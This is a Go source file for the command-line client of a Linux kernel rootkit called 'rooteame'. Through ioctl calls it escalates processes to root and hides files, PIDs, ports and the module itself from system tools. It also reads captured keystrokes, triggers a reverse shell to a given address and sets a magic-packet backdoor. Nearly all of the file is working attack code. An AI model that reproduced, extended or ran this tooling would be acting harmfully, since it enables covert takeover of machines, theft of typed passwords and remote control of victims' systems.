package main

import (
	"encoding/binary"
	"fmt"
	"os"
	"strconv"
	"strings"
	"unsafe"

	"github.com/ruby570bocadito/rooteame/internal/ioctl"
)

const devicePath = "/dev/rooteame"

func openDevice() (*os.File, error) {
	f, err := os.OpenFile(devicePath, os.O_RDWR, 0)
	if err != nil {
		return nil, fmt.Errorf("cannot open %s: %w (is rootkit loaded?)", devicePath, err)
	}
	return f, nil
}

func giveRoot(f *os.File, pid int) error {
	if pid == 0 {
		pid = os.Getpid()
	}
	buf := make([]byte, 4)
	binary.LittleEndian.PutUint32(buf, uint32(pid))
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GIVE_ROOT, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[+] Granted root to PID %d\n", pid)
	return nil
}

func hideFile(f *os.File, name string) error {
	buf := make([]byte, 256)
	copy(buf, name)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_HIDE_FILE, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[+] Hiding file/dir: %s\n", name)
	return nil
}

func unhideFile(f *os.File, name string) error {
	buf := make([]byte, 256)
	copy(buf, name)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_UNHIDE_FILE, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[-] Revealed: %s\n", name)
	return nil
}

func hidePID(f *os.File, pid int) error {
	buf := make([]byte, 4)
	binary.LittleEndian.PutUint32(buf, uint32(pid))
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_HIDE_PID, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[+] Hiding PID: %d\n", pid)
	return nil
}

func unhidePID(f *os.File, pid int) error {
	buf := make([]byte, 4)
	binary.LittleEndian.PutUint32(buf, uint32(pid))
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_UNHIDE_PID, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[-] Revealed PID: %d\n", pid)
	return nil
}

func hidePort(f *os.File, port uint16) error {
	buf := make([]byte, 2)
	binary.LittleEndian.PutUint16(buf, port)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_HIDE_PORT, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[+] Hiding port: %d\n", port)
	return nil
}

func unhidePort(f *os.File, port uint16) error {
	buf := make([]byte, 2)
	binary.LittleEndian.PutUint16(buf, port)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_UNHIDE_PORT, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[-] Revealed port: %d\n", port)
	return nil
}

func listHidden(f *os.File) error {
	buf := make([]byte, 4096)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_LIST_HIDDEN, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	output := strings.TrimRight(string(buf), "\x00")
	if output == "" {
		fmt.Println("(nothing hidden)")
	} else {
		fmt.Print(output)
	}
	return nil
}

func keylogRead(f *os.File) error {
	buf := make([]byte, 4096)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_READ, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	output := strings.TrimRight(string(buf), "\x00")
	if output == "" {
		fmt.Println("[*] (no keystrokes captured)")
	} else {
		fmt.Printf("[*] Keystroke log:\n%s\n", output)
	}
	return nil
}

func keylogClear(f *os.File) error {
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_CLEAR, unsafe.Pointer(nil))
	if err != 0 {
		return err
	}
	fmt.Println("[+] Keylogger buffer cleared")
	return nil
}

func backdoorShell(f *os.File, target string) error {
	buf := make([]byte, 256)
	copy(buf, target)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_BACKDOOR_SHELL, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[+] Reverse shell triggered -> %s\n", target)
	return nil
}

func backdoorMagic(f *os.File, word string) error {
	buf := make([]byte, 16)
	copy(buf, word)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_BACKDOOR_MAGIC, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[+] Magic packet backdoor enabled: '%s'\n", word)
	return nil
}

func hideModule(f *os.File) error {
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_MODULE_HIDE, unsafe.Pointer(nil))
	if err != 0 {
		return err
	}
	fmt.Println("[+] Module hidden from lsmod")
	return nil
}

func unhideModule(f *os.File) error {
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_MODULE_UNHIDE, unsafe.Pointer(nil))
	if err != 0 {
		return err
	}
	fmt.Println("[-] Module visible again in lsmod")
	return nil
}

func printUsage() {
	fmt.Print(`rooteame CLI — Kernel Rootkit Control

Usage:
  rooteame <command> [arguments]

Commands:
  status           Check if rootkit is loaded
  give-root [pid]  Escalate process to root (default: self)
  hide-file <name> Hide a file/directory
  unhide-file <name> Reveal a hidden file/directory
  hide-pid <pid>   Hide a process from ps, top, /proc
  unhide-pid <pid> Reveal a hidden process
  hide-port <port> Hide a TCP/UDP port from netstat, ss
  unhide-port <port> Reveal a hidden port
  list             List all hidden items
  shell <ip:port>  Trigger reverse shell
  magic <word>     Set magic packet trigger word
  keylog           Read captured keystrokes
  keylog-clear     Clear keylogger buffer
  hide-module      Hide rootkit from lsmod
  unhide-module    Make rootkit visible in lsmod
`)
}

func run() error {
	if len(os.Args) < 2 {
		printUsage()
		return nil
	}

	if os.Args[1] == "status" {
		if _, err := os.Stat(devicePath); err == nil {
			fmt.Printf("[*] rooteame kernel module is LOADED\n    Device: %s\n", devicePath)
		} else {
			fmt.Println("[*] rooteame kernel module is NOT loaded")
			fmt.Println("    Run: sudo insmod rooteame.ko")
		}
		return nil
	}

	if os.Args[1] == "-h" || os.Args[1] == "--help" || os.Args[1] == "help" {
		printUsage()
		return nil
	}

	f, err := openDevice()
	if err != nil {
		return err
	}
	defer f.Close()

	cmd := os.Args[1]

	switch cmd {
	case "give-root":
		pid := 0
		if len(os.Args) > 2 {
			pid, _ = strconv.Atoi(os.Args[2])
		}
		return giveRoot(f, pid)

	case "hide-file":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: rooteame hide-file <name>")
		}
		return hideFile(f, os.Args[2])

	case "unhide-file":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: rooteame unhide-file <name>")
		}
		return unhideFile(f, os.Args[2])

	case "hide-pid":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: rooteame hide-pid <pid>")
		}
		pid, err := strconv.Atoi(os.Args[2])
		if err != nil {
			return fmt.Errorf("invalid PID: %s", os.Args[2])
		}
		return hidePID(f, pid)

	case "unhide-pid":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: rooteame unhide-pid <pid>")
		}
		pid, err := strconv.Atoi(os.Args[2])
		if err != nil {
			return fmt.Errorf("invalid PID: %s", os.Args[2])
		}
		return unhidePID(f, pid)

	case "hide-port":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: rooteame hide-port <port>")
		}
		p, err := strconv.Atoi(os.Args[2])
		if err != nil || p < 1 || p > 65535 {
			return fmt.Errorf("invalid port: %s", os.Args[2])
		}
		return hidePort(f, uint16(p))

	case "unhide-port":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: rooteame unhide-port <port>")
		}
		p, err := strconv.Atoi(os.Args[2])
		if err != nil || p < 1 || p > 65535 {
			return fmt.Errorf("invalid port: %s", os.Args[2])
		}
		return unhidePort(f, uint16(p))

	case "list":
		return listHidden(f)

	case "shell":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: rooteame shell <ip:port>")
		}
		target := os.Args[2]
		if !strings.Contains(target, ":") {
			return fmt.Errorf("invalid target format, use ip:port")
		}
		return backdoorShell(f, target)

	case "magic":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: rooteame magic <word>")
		}
		return backdoorMagic(f, os.Args[2])

	case "keylog":
		return keylogRead(f)

	case "keylog-clear":
		return keylogClear(f)

	case "hide-module":
		return hideModule(f)

	case "unhide-module":
		return unhideModule(f)

	default:
		return fmt.Errorf("unknown command: %s\nRun 'rooteame help' for usage", cmd)
	}
}

func main() {
	if os.Geteuid() != 0 {
		fmt.Fprintln(os.Stderr, "[!] Warning: not running as root. Some commands may fail.")
	}
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "[-] Error: %v\n", err)
		os.Exit(1)
	}
}
